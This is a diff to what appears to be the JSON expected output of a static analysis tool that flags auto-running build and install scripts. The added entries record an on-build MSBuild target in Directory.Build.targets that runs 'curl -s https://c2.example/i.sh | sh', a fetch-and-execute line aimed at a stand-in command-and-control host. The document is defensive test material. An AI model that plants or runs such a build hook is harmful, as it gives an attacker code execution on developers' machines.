@@ -53,7 +53,7 @@
       "number": 6,
       "title": "Install scripts and shell commands",
       "explanation": "Every command a project file asks a tool or package manager to run (package.json scripts, editor tasks, agent hooks, git settings and more): when it runs, and the commands inside it that we could not follow.",
-      "count": 1,
+      "count": 2,
       "anchor": "install-scripts-and-shell-commands"
     },
     {
@@ -69,7 +69,7 @@
       "number": 8,
       "title": "Unresolved",
       "explanation": "Places where static analysis cannot say what happens (computed code, dynamic loads, shell commands). Each one hides behaviour.",
-      "count": 0,
+      "count": 2,
       "anchor": "unresolved"
     },
     {
@@ -85,7 +85,7 @@
       "number": 10,
       "title": "Not analysed",
       "explanation": "Files and folders that were not read as code, by kind, and anything skipped by a limit.",
-      "count": 6,
+      "count": 2,
       "anchor": "not-analysed"
     },
     {
@@ -99,9 +99,9 @@
   ],
   "overview": {
     "files_analysed": 0,
-    "files_not_analysed": 6,
+    "files_not_analysed": 2,
     "functions": 0,
-    "facts": 1,
+    "facts": 4,
     "links_made": 0,
     "unresolved_cleared_by_links": 0,
     "completeness": "incomplete",
@@ -109,7 +109,7 @@
       {
         "section": "unresolved",
         "label": "places where static analysis cannot say what happens",
-        "count": 0
+        "count": 2
       },
       {
         "section": "unlinked",
@@ -124,7 +124,7 @@
       {
         "section": "not_analysed",
         "label": "files or folders not read as code",
-        "count": 6
+        "count": 2
       },
       {
         "section": "dependencies",
@@ -160,7 +160,7 @@
       },
       {
         "kind": "lifecycle_script",
-        "count": 1
+        "count": 2
       },
       {
         "kind": "dependency",
@@ -168,7 +168,7 @@
       },
       {
         "kind": "unresolved",
-        "count": 0
+        "count": 2
       },
       {
         "kind": "flow",
@@ -191,6 +191,42 @@
   "effects": [],
   "flows": [],
   "scripts": [
+    {
+      "id": "fact:a35b709d4971d83f",
+      "at": {
+        "file": {
+          "text": "Directory.Build.targets",
+          "truncated": false,
+          "original_len": 23,
+          "sha256": "50e91c82311ea26f2a73202525dfdf2b0a89c178ee666b2bf3ad4c84ac4c06dc"
+        },
+        "start_line": 3,
+        "end_line": 3,
+        "start_byte": 86,
+        "end_byte": 122
+      },
+      "name": {
+        "text": "FetchSomething",
+        "truncated": false,
+        "original_len": 14,
+        "sha256": "4aa0ac558ea7283b499c0ae134001ff39e1ae8f42421ce7ffcdcc7a16ce43b23"
+      },
+      "trigger": "on_build",
+      "command": {
+        "text": "curl -s https://c2.example/i.sh | sh",
+        "truncated": false,
+        "original_len": 36,
+        "sha256": "1edeb4e06d0694ee9e9d37fbcc190091761ee5c2dcfeb703973367b3246056ad"
+      },
+      "unfollowed": [
+        {
+          "text": "curl -s https://c2.example/i.sh | sh",
+          "truncated": false,
+          "original_len": 36,
+          "sha256": "1edeb4e06d0694ee9e9d37fbcc190091761ee5c2dcfeb703973367b3246056ad"
+        }
+      ]
+    },
     {
       "id": "fact:e7042078d8bacb0d",
       "at": {
@@ -222,7 +258,66 @@
     }
   ],
   "dependencies": [],
-  "unresolved": [],
+  "unresolved": [
+    {
+      "reason": "shell_command",
+      "items": [
+        {
+          "id": "fact:5d74cb891cff26ce",
+          "at": {
+            "file": {
+              "text": "Directory.Build.targets",
+              "truncated": false,
+              "original_len": 23,
+              "sha256": "50e91c82311ea26f2a73202525dfdf2b0a89c178ee666b2bf3ad4c84ac4c06dc"
+            },
+            "start_line": 3,
+            "end_line": 3,
+            "start_byte": 86,
+            "end_byte": 122
+          },
+          "detail": {
+            "text": "curl -s https://c2.example/i.sh | sh",
+            "truncated": false,
+            "original_len": 36,
+            "sha256": "1edeb4e06d0694ee9e9d37fbcc190091761ee5c2dcfeb703973367b3246056ad"
+          },
+          "in_fn": null,
+          "lanes": [],
+          "reachable": null
+        }
+      ]
+    },
+    {
+      "reason": "unsupported_syntax",
+      "items": [
+        {
+          "id": "fact:96ec1c4c110ab3ee",
+          "at": {
+            "file": {
+              "text": "NuGet.Config",
+              "truncated": false,
+              "original_len": 12,
+              "sha256": "b54ee602750f150b3d4986e0334cc3ec901d47510560e26e792e8d294ab6f37a"
+            },
+            "start_line": 3,
+            "end_line": 3,
+            "start_byte": 39,
+            "end_byte": 103
+          },
+          "detail": {
+            "text": "package source example: https://feed.example/v3/index.json",
+            "truncated": false,
+            "original_len": 58,
+            "sha256": "d90084885c79de37b0ccc959bb4abe518b43f30a9531b9b97eff1ca7326aea6d"
+          },
+          "in_fn": null,
+          "lanes": [],
+          "reachable": null
+        }
+      ]
+    }
+  ],
   "unlinked": [],
   "package_calls": [],
   "not_analysed": {
@@ -230,46 +325,6 @@
       {
         "kind": "auto_run_config",
         "items": [
-          {
-            "path": {
-              "text": "Directory.Build.props",
-              "truncated": false,
-              "original_len": 21,
-              "sha256": "9da24614831c308827a1ae533ffea392c97638c261dd42bd0f5226baa136d16e"
-            },
-            "size": 96,
-            "kind": "auto_run_config"
-          },
-          {
-            "path": {
-              "text": "Directory.Build.targets",
-              "truncated": false,
-              "original_len": 23,
-              "sha256": "50e91c82311ea26f2a73202525dfdf2b0a89c178ee666b2bf3ad4c84ac4c06dc"
-            },
-            "size": 150,
-            "kind": "auto_run_config"
-          },
-          {
-            "path": {
-              "text": "NuGet.Config",
-              "truncated": false,
-              "original_len": 12,
-              "sha256": "b54ee602750f150b3d4986e0334cc3ec901d47510560e26e792e8d294ab6f37a"
-            },
-            "size": 141,
-            "kind": "auto_run_config"
-          },
-          {
-            "path": {
-              "text": "src/App/App.csproj",
-              "truncated": false,
-              "original_len": 18,
-              "sha256": "0a6d44a2ce0c43d8994a2831f7153ef35b022757dcbd2d8a348a8682c9cb008e"
-            },
-            "size": 116,
-            "kind": "auto_run_config"
-          },
           {
             "path": {
               "text": "src/App/Directory.Build.rsp",
